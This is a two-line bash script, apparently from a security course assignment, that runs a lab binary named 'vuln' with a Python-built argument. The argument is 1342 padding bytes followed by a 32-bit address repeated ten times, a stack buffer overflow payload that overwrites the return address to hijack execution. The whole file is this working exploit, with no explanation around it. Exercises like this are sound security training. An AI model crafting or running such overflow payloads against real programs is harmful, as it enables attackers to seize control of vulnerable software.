#!/usr/bin/env bash
/task2/s1817972/vuln "$(python -c "print('\x41'* 1342 + '\x56\x85\x04\x08' * 10)")"
